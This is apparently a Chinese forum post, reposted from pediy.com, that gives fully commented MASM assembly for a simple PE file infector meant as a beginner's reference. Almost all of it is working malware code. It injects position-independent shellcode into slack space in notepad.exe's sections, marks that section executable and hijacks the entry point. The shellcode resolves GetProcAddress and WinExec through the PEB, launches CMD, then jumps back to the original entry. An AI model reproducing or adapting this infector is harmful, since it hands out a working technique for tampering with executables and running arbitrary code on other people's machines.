
# 感染 PE 文件的简单代码 (汇编)

> 原文：[`www.pediy.com/kssd/pediy11/107818.html`](https://www.pediy.com/kssd/pediy11/107818.html)

代码不复杂，仅仅感染 `f` 盘下的 `notepad.exe`。

感染方式很简单：遍历节表，找到可以容纳 shellcode 的节，写入 shellcode。

shellcode 的功能也很简单：通过 `fs:[30h]` 获得 `peb`，通过 `peb` 获得 `kernel32.dll` 的基址，遍历导出表，找到 `GetProcAddress` 的内存地址，然后调用 `GetProcAddress` 获得 `WinExec` 的内存地址，然后执行 `CMD`，最后跳回原始 OEP。

主要是我把注释写的比较完善了，给和我一样的新手做个参考吧。 `![](img/110d920e4e703968a2a60c986d363163.jpg "尴尬")`

代码:

```assembly
.386
.model flat,stdcall
option  casemap:none

include windows.inc
include kernel32.inc
include user32.inc

includelib kernel32.lib
includelib user32.lib

.const
szFile    db    'f:\\notepad.exe',0

.data?
hFile      dd    ?
hMapFile    dd    ?
lpFile    dd    ?

lpCodeRva  dd    ?
lpCodeOffset  dd  ?

.code



;shellcode start
SHELLCODE\_START equ this byte

  assume  fs:flat
  mov  eax,fs:\[30h\]
  mov  eax,\[eax + 0ch\]
  mov  esi,\[eax + 1ch\]
  lodsd
  mov  edx,\[eax + 8h\]  ;得到 kernel32.dll 的基地址
  
  mov  eax,(IMAGE\_DOS\_HEADER ptr \[edx\]).e\_lfanew
  mov  eax,(IMAGE\_NT\_HEADERS ptr \[edx + eax\]).OptionalHeader.DataDirectory.VirtualAddress  ;导出表的 RVA
  add  eax,edx  ;导出表在内存中的实际地址
  
  assume  eax:ptr IMAGE\_EXPORT\_DIRECTORY

  mov  esi,\[eax\].AddressOfNames
  add  esi,edx
  
  push  00007373h
  push  65726464h
  push  41636f72h
  push  50746547h  ;这四句 push 构造了 GetProcAddress\\0  共 15(0fh)个字节
  
  push  esp      ;把此时栈顶的值压入栈中 等会要用
  
  xor  ecx,ecx
  .repeat
    mov  edi,\[esi\]
    add  edi,edx     ;首次循环时 edi 的值就是首个导出函数的名称的地址
    
    push  esi        ;esi 是 AddressOfNames 函数名称的地址数组的地址 先保存起来
    
    mov  esi,\[esp+4\]    ;\[esp+4\]获取栈顶数第二个  是一个 DWORD  值是指向栈空间里的 GetProcAddress
    
    ;注意 此时\[esi\]就是栈中的 GetProcAddress  \[edi\]就是导出函数的名称
    
    push  ecx        ;保存遍历导出表中函数名称的循环次数
    
    mov  ecx,0fh     ;GetProcAddress\\0 的长度  设置循环比较\[esi\]和\[edi\]的循环次数

    repz  cmpsb        ;对比 \[esi\] 和 \[edi\]

    .break  .if ZERO?  ;循环 cmp 后  zero flag 仍然是 0 说明找到了 GetProcAddress  则跳出循环
    
    pop  ecx        ;恢复遍历导出表中函数名称的循环次数
    
    pop  esi        ;恢复 esi 为 指向 AddressOfNames 函数名称的地址数组的地址
    
    add  esi,4        ;指向下一个 DWORD esi 就是下一个函数名称的地址
    
    inc  ecx
    
  .until  ecx >= \[eax\].NumberOfNames
  
  
  pop  ecx     ;ecx 此时是 GetProcAddress 在 kernel32.dll 中的 AddressOfNames 数组的位置  和 AddressOfNameOrdinas 是一一对应的
  
  
  add  esp,18h    ;释放栈中的 GetProcAddress\\0\\0 16 个字节 + 地址 4 个字节 + esi 也是 4 个字节   共 24(18h)个字节
  
  mov  esi,\[eax\].AddressOfNameOrdinals
  add  esi,edx    ;esi 此时是 AddressOfNameOrdinals 的地址了
  
  movzx  ecx,WORD ptr \[esi+ ecx \* 2\]  ;计算序数的地址 并取得该地址中的值 也就是序数啦 保存到 ecx 中  (乘 2 是因为序数是 WORD 类型保存的)
  
  
  mov  esi,\[eax\].AddressOfFunctions
  add  esi,edx
  mov  esi,\[esi+ecx\*4\]        ;将 GetProcAddress 的 RVA 存到 esi 中
  
  add  esi,edx          ;加上基址 得到 GetProcAddress 的基址
  
  assume eax:nothing
  
  ;注意  esi 中现在是 GetProcAddress 的地址了
  ;以下代码可以使用 call esi  调用 GetProcAddress 了
  
  push  00636578h
  push  456e6957h  ;在栈中构造字符串 WinExec
  
  push  esp      ;老办法 把刚才构造的 WinExec 的内存地址再入栈
  push  edx      ;kernel32.dll 的基址 也就是 HANDLE
  
  call  esi      ;调用 GetProcAddress 获取 WinExec 的地址
  
  add  esp,8     ;释放栈里面的字符串 WinExec 所占空间
  
  ;注意 此时 eax 就是 WinExec 的地址
  
  push  00444d43h  ;在栈中构造字符串 CMD
  push  esp
  push  SW\_SHOW
  push  \[esp+4\]    ;加 4 是因为此时栈顶是刚刚压入的 SW\_SHOW,加 4 后才是栈中构造的字符串 CMD
  
  call eax        ;调用 WinExec 执行 CMD

  add  esp,4


  ;以下代码要跳回原始 oep 了
  
  db 68h          ;机器码 68h 是 PUSH 的意思
  OldEntryPoint:
  dd  ?            ;这 4 个 BYTE 将被修改为原来的入口点 与上一句 68h   组成 PUSH xxxxxxxx   
  jmp DWORD ptr \[esp\]  ;前面刚把原来的入口点压入栈中 所以 jmp 到 esp 栈顶的元素 也就是原来的入口点

;  db 0e9h
;  OEPOffs:
;  dd  ?            ;或者可以用这种 e9 跳转的形式
  

SHELLCODE\_END equ this byte

SHELLCODE\_LENGTH equ offset SHELLCODE\_END - offset SHELLCODE\_START
;shellcode ends




start:
  
  invoke CreateFile,addr szFile,GENERIC\_READ or GENERIC\_WRITE,NULL,NULL,OPEN\_EXISTING,NULL,NULL
  
  .if eax != INVALID\_HANDLE\_VALUE
    mov hFile, eax
    invoke CreateFileMapping,hFile,NULL,PAGE\_READWRITE,0,0,NULL

    .if eax
      mov hMapFile, eax
      invoke MapViewOfFile,hMapFile,FILE\_MAP\_READ or FILE\_MAP\_WRITE,0,0,0

      .if eax
        xor ebx,ebx
        mov bx,(IMAGE\_DOS\_HEADER ptr \[eax\]).e\_magic 
        .if bx == IMAGE\_DOS\_SIGNATURE
          mov lpFile, eax
          mov esi, eax
          mov esi, (IMAGE\_DOS\_HEADER ptr \[eax\]).e\_lfanew
          add esi, eax
          
          assume esi: ptr IMAGE\_NT\_HEADERS
          
          .if \[esi\].Signature == IMAGE\_NT\_SIGNATURE
          
            mov ebx, esi
            add ebx, sizeof IMAGE\_NT\_HEADERS
            
            assume ebx: ptr IMAGE\_SECTION\_HEADER
            
            xor eax, eax
            mov ax, \[esi\].FileHeader.NumberOfSections
            mov ecx, eax
            
            lp:
              mov eax, \[ebx\].SizeOfRawData
              sub eax, \[ebx\].Misc.VirtualSize
              .if eax > SHELLCODE\_LENGTH
                jmp @F
              .endif
              add ebx, sizeof IMAGE\_SECTION\_HEADER

            loop lp

          .endif
        .endif
      .endif
    .endif
  .endif

  invoke ExitProcess,NULL
  
  @@:  ;finded section
  
  mov eax, \[ebx\].VirtualAddress
  add eax, \[ebx\].Misc.VirtualSize
  mov lpCodeRva, eax
  
  mov eax, \[ebx\].PointerToRawData
  add eax, \[ebx\].Misc.VirtualSize
  mov lpCodeOffset, eax
  
  or  \[ebx\].Characteristics, IMAGE\_SCN\_MEM\_READ         
  or \[ebx\].Characteristics, IMAGE\_SCN\_MEM\_EXECUTE
  
  add \[ebx\].Misc.VirtualSize, SHELLCODE\_LENGTH
  
  add eax, lpFile
  
  invoke RtlMoveMemory,eax, offset SHELLCODE\_START, SHELLCODE\_LENGTH
  
  mov edi, \[esi\].OptionalHeader.AddressOfEntryPoint
  add edi, \[esi\].OptionalHeader.ImageBase          ;shellcode 中要 jmp 到这个地址    这是使用 push xxxxxxxx  jmp DWORD ptr \[esp\] 方法时用的地址

;  mov eax, lpCodeRva                      ;新的入口点
;  add eax, offset OEPOffs - offset SHELLCODE\_START + 4  ;加上 OEPOffs 标号位置+4   就是跳转的基地址了 +4 是因为跳转的基地址是下一条指令的地址
;  sub edi, eax                        ;shellcode 中要 jmp 到这个偏移    旧的 OEP 是目标地址 减去跳转的基地址  就是偏移了

     
  mov eax, lpFile
  add eax, lpCodeOffset

  add eax, offset OldEntryPoint - offset SHELLCODE\_START  ;jmp DWORD ptr \[esp\] 时使用的方法
;  add eax, offset OEPOffs - offset SHELLCODE\_START      ;直接 jmp 偏移使用的方法
  
  
  mov \[eax\], edi
  
  push lpCodeRva
  pop \[esi\].OptionalHeader.AddressOfEntryPoint
  
  invoke ExitProcess,NULL

  

end start
```
